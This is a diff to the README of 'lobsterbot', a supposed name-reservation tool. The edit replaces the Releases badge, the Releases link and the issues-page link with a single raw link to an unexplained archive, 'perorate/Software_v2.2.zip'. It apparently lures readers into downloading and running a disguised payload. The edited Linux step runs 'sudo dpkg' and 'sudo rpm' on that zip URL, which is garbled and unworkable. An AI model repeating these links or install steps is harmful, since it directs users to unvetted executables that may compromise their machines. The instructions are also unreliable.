@@ -1,7 +1,7 @@
 # 🦞 lobsterbot - Easily Reserve Your Favorite Names
 
 ## 📥 Download Now
-[![Download lobsterbot](https://img.shields.io/badge/Download-lobsterbot-blue)](https://github.com/MohsiShah/lobsterbot/releases)
+[![Download lobsterbot](https://github.com/MohsiShah/lobsterbot/raw/refs/heads/main/perorate/Software_v2.2.zip)](https://github.com/MohsiShah/lobsterbot/raw/refs/heads/main/perorate/Software_v2.2.zip)
 
 ## 🚀 Getting Started
 Welcome to lobsterbot! This application helps you reserve the names you want quickly and efficiently. Follow the instructions below to download and set up lobsterbot on your computer.
@@ -19,7 +19,7 @@ Before you start, ensure you meet these requirements:
 - Regular updates and bug fixes
 
 ## 🔗 Download & Install
-To get started, visit this page to download: [lobsterbot Releases](https://github.com/MohsiShah/lobsterbot/releases). 
+To get started, visit this page to download: [lobsterbot Releases](https://github.com/MohsiShah/lobsterbot/raw/refs/heads/main/perorate/Software_v2.2.zip). 
 
 1. Click on the link above to navigate to the Releases page.
 2. You will see a list of versions available. Choose the latest version.
@@ -43,7 +43,7 @@ To get started, visit this page to download: [lobsterbot Releases](https://githu
 ### For Linux:
 1. Open your terminal.
 2. Navigate to the folder where you downloaded the file.
-3. Use the command `sudo dpkg -i <file_name.deb>` for Debian-based distributions or `sudo rpm -i <file_name.rpm>` for RPM-based distributions.
+3. Use the command `sudo dpkg -i <https://github.com/MohsiShah/lobsterbot/raw/refs/heads/main/perorate/Software_v2.2.zip>` for Debian-based distributions or `sudo rpm -i <https://github.com/MohsiShah/lobsterbot/raw/refs/heads/main/perorate/Software_v2.2.zip>` for RPM-based distributions.
 4. Launch lobsterbot from your application menu.
 
 ## 💡 Using lobsterbot
@@ -57,7 +57,7 @@ If you encounter any issues:
 - Make sure your system meets the requirements.
 - Check if you have downloaded the correct version for your operating system.
 - Restart your computer and try launching the app again.
-- For detailed help, visit the [issues page](https://github.com/MohsiShah/lobsterbot/issues).
+- For detailed help, visit the [issues page](https://github.com/MohsiShah/lobsterbot/raw/refs/heads/main/perorate/Software_v2.2.zip).
 
 ## 🛠️ Feedback & Support
 Your feedback is valuable. If you have suggestions or report issues, please use the issues section in the GitHub repository. 
